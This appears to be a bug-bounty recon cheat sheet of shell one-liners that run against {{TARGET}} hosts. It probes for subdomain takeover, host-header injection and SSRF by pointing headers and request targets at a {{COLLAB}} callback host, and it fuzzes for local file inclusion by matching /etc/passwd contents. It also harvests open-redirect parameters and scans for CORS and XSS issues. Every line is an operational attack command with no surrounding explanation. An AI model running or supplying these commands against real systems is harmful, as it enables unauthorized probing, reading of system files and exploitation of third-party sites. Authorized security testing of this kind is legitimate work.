$ subzy run --targets hosts_alive.txt --concurrency 100 --hide_fails --verify_ssl
$ cat hosts_alive.txt | xargs -I % sh -c 'echo "Scanning: %" && curl -I % -H "Host: {{COLLAB}}" -H "X-Forwarded-Host: {{COLLAB}}" -H "X-Original-Host: {{COLLAB}}" -H "X-Forwarded-Server: {{COLLAB}}" -H "X-Host: {{COLLAB}}" -H "X-Real-IP: {{COLLAB}}" -H "X-Forwarded-For: {{COLLAB}}" -H "Forwarded: for={{COLLAB}};host={{TARGET}};proto=https"'
$ cat hosts_alive.txt | xargs -I % curl -I % -H "X-Forwarded-Host: {{COLLAB}}" -H "X-Original-Host: {{COLLAB}}" -H "X-Forwarded-Server: {{COLLAB}}" -H "X-Host: {{COLLAB}}" -H "X-Real-IP: {{COLLAB}}" -H "X-Forwarded-For: {{COLLAB}}" -H "Forwarded: for={{COLLAB}};host={{TARGET}};proto=https"    
$ cat all{{TARGET}}urls.txt | grep "=" | qsreplace {{COLLAB}} | httpx
$ cat all{{TARGET}}urls.txt | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w /mnt/d/Desktop/lostsec-payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
$ python ~/Corsy/corsy.py -i hosts_alive.txt -o corsy_results.txt 
$ cat hosts_alive.txt | while read url; do echo -e "\033[1;32m$url\033[0m"; xss1=$(curl -s -L "$url" -H 'X-Forwarded-For: {{COLLAB}}' | grep xss); xss2=$(curl -s -L "$url" -H 'X-Forwarded-Host: {{COLLAB}}' | grep xss); xss3=$(curl -s -L "$url" -H 'Host: {{COLLAB}}' | grep xss); xss4=$(curl -s -L "$url" --request-target http://{{COLLAB}}/ --max-time 2); echo "Method[1] X-Forwarded-For: xss+ssrf => $xss1"; echo "Method[2] X-Forwarded-Host: xss+ssrf => $xss2"; echo "Method[3] Host: xss+ssrf => $xss3"; echo "Method[4] GET request-target => $xss4"; done
$ cat all{{TARGET}}urls.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
$ all{{TARGET}}urls.txt | gf redirect | uro | sort -u | anew redirect_params.txt
$ cat redirect_params.txt | qsreplace "https://{{COLLAB}}" | httpx-toolkit -silent -fr -mr "{{COLLAB}}"
$ python3  ~/Corsy/corsy.py -i all{{TARGET}} | tee cors_results.txt
$ sif -d {{TARGET}}

